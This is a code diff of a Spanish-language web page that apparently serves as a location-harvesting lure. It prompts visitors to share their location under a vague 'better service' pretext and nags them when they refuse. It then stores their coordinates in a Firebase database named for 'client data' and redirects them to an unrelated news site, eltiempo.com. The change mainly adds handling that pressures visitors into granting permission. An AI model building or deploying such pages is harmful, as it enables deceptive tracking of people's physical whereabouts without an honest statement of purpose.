@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -17,15 +16,24 @@
       projectId: "base-de-datos-clientes-ea806",
       storageBucket: "base-de-datos-clientes-ea806.firebasestorage.app",
       messagingSenderId: "711168578601",
-      appId: "1:711168578601:web:2f4784c0382f63376ff838",
-      measurementId: "G-BX5D7X4DCM"
+      appId: "1:711168578601:web:2f4784c0382f63376ff838"
     };
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
     function solicitarUbicacion() {
-      if (navigator.geolocation) {
+      if (!navigator.geolocation) {
+        alert("Tu navegador no admite geolocalización.");
+        return;
+      }
+
+      navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+        if (result.state === 'denied') {
+          alert("Debes habilitar los permisos de ubicación en tu navegador.");
+          return;
+        }
+
         navigator.geolocation.getCurrentPosition(
           (position) => {
             const datos = {
@@ -37,16 +45,18 @@
             set(refUbicaciones, datos).then(() => {
               window.location.href = "https://www.eltiempo.com";
             }).catch(err => {
-              alert("Error al guardar ubicación: " + err.message);
+              alert("Error al guardar ubicación en Firebase: " + err.message);
             });
           },
           (error) => {
-            alert("No se pudo obtener ubicación: " + error.message);
+            if (error.code === error.PERMISSION_DENIED) {
+              alert("Debes permitir el acceso a tu ubicación para continuar.");
+            } else {
+              alert("Error al obtener la ubicación: " + error.message);
+            }
           }
         );
-      } else {
-        alert("Este navegador no permite geolocalización.");
-      }
+      });
     }
 
     window.onload = () => {
@@ -54,10 +64,7 @@
     };
   </script>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
+    * { box-sizing: border-box; }
     body {
       margin: 0;
       font-family: 'Roboto', sans-serif;
@@ -69,7 +76,6 @@
       min-height: 100vh;
       padding: 20px;
     }
-
     .contenedor {
       background: #ffffff;
       color: #333;
@@ -79,19 +85,9 @@
       width: 100%;
       text-align: center;
       box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      animation: fadeIn 1s ease;
     }
-
-    h2 {
-      margin-bottom: 10px;
-      font-size: 24px;
-    }
-
-    p {
-      margin-bottom: 30px;
-      font-size: 16px;
-    }
-
+    h2 { margin-bottom: 10px; font-size: 24px; }
+    p { margin-bottom: 30px; font-size: 16px; }
     button {
       background-color: #2a5298;
       color: white;
@@ -102,39 +98,21 @@
       cursor: pointer;
       transition: background 0.3s ease;
     }
-
     button:hover {
       background-color: #1e3c72;
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
     @media (max-width: 480px) {
-      .contenedor {
-        padding: 30px 20px;
-      }
-
-      h2 {
-        font-size: 20px;
-      }
-
-      p {
-        font-size: 14px;
-      }
-
-      button {
-        width: 100%;
-      }
+      .contenedor { padding: 30px 20px; }
+      h2 { font-size: 20px; }
+      p { font-size: 14px; }
+      button { width: 100%; }
     }
   </style>
 </head>
 <body>
   <div class="contenedor">
     <h2>¿Deseas compartir tu ubicación?</h2>
-    <p>Con tu permiso podemos brindarte contenido más relevante y servicios mejorados.</p>
+    <p>Activa los permisos para brindarte un mejor servicio.</p>
     <button id="aceptarBtn">Compartir ubicación</button>
   </div>
 </body>
